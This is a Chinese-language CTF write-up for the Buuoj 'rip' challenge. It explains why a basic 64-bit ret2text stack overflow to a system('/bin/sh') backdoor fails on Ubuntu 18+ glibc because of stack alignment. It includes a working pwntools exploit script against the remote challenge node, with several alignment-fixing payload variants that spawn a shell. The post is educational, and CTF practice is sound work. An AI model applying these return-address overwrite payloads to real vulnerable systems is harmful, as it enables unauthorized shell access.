---
title: 「Pwn」Ubuntu18 中 64位 ELF 在调用 system 时候可能出现的问题
description: nova在文章中探讨了在Ubuntu18系统上运行64位ELF文件时，调用`system`函数可能出现的问题。文章描述了一个CTF挑战题目，该题目比较简单，涉及基本的栈溢出攻击。然而，当作者在远程服务器上执行相同操作时却出错了，并在自己的Ubuntu18系统上也重现了此问题。
pubDate: 2022-03-31
tags:
- Pwn
- cheatsheet
- CTF
authors:
- nova
---

# Ubuntu18中64位ELF在调用system时候可能出现的问题

这几天配好了Ubuntu18，测试的时候出现了一个问题。

研究了好久才解决，记录一下。

[题目\__Buuoj__RIP](https://buuoj.cn/challenges#rip)

<!--truncate-->

### 问题

这题是最基础的一个栈溢出题。有后门函数直接`system("/bin/sh");`，什么保护都没开，直接把返回地址覆盖按理来说就可以了。

本地测试的时候也确实是这样的，但是远程却出现了问题。

于是我拿自己的Ubuntu18测试了一下，发现同样出现了错误。

一通搜索之后才发现，ubuntu18及以上的libc中，64位ELF程序调用system函数时候需要考虑堆栈平衡

### 解决方法

改变Payload的长度或者进行栈转移即可



主要思路就是改变栈的地址。

这里贴一下exp

```python
from pwn import *
context(log_level='debug', arch='amd64', os='linux')

# sh = process("./pwn1")
sh = remote("node4.buuoj.cn", 29726)

# sh.recvuntil('please input\n')

backdoor_addr = 0x0401186
# payload = b'a'*(0xf+8) + p64(backdoor_addr) # 正常思考，但是没有对齐所以会错误
# payload = b'a'*0xf + p64(backdoor_addr) # exp1, 但是稍微有点没看明白为什么这样可以:<
# payload = b'a'*(0xf+8) + p64(backdoor_addr) + p64(backdoor_addr - 1) # exp 2, 这里的backdoor_addr - 1对应了一个retn，换成其他的也可以，也是为了堆栈平衡
payload = b'a'*(0xf+8) + p64(backdoor_addr + 1) # exp 3, +1 让call_system函数中检查对齐的那个地址对齐0x10
"""
不一定是+1,最多16次肯定能对齐,还不行就栈转移吧www
"""
sh.sendline(payload)
sh.interactive()
```

### 深入

在这里我准备深入研究一下此时的堆栈，也算是gdb的初探门径

> 寄，Ubuntu18的gdb好像炸了。等修好了再补充:&lt;



## 参考博客

[在一些64位的glibc的payload调用system函数失败问题](http://blog.eonew.cn/archives/958)

[ret2text涉及到的堆栈平衡问题](https://blog.csdn.net/qq_41560595/article/details/112161243)

[升级gcc7.3之后MOVAPS指令导致的程序coredump解决过程](https://www.pianshen.com/article/8326860581/)
